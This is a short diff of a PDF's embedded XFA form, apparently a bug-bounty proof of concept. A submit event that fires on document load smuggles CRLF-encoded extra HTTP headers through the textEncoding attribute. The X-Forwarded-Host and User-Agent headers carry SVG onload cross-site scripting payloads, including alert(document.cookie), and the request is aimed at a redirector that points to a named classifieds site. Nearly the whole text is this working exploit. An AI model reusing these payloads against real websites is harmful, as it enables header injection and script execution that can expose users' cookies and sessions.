@@ -18,7 +18,7 @@ stream
         <field id="Hello World!">
             <event activity="docReady" ref="$host" name="event__click">
                <submit 
-                     textEncoding="UTF-aaaa&#xD;&#xA;X-Forwarded-For: &#x3C;svg/onload=alert(document.domain)&#x3E;&#xD;&#xA;X-Forwarded-Host: &#x3C;svg/onload=alert(document.domain)&#x3E;&#xD;&#xA;User-Agent: &#x3C;svg/onload=alert(document.domain)&#x3E;"
+                     textEncoding="UTF-8&#xD;&#xA;X-Forwarded-Host: &#x3C;svg/onload=alert(document.domain)&#x3E;&#xD;&#xA;User-Agent: &#x3C;svg/onload=alert(document.cookie)&#x3E;"
                      xdpContent="pdf datasets template"
                      target="https://bughunt1307.herokuapp.com/redirector.php?x=https://www.ebay-kleinanzeigen.de/info.jsp"/>
             </event>
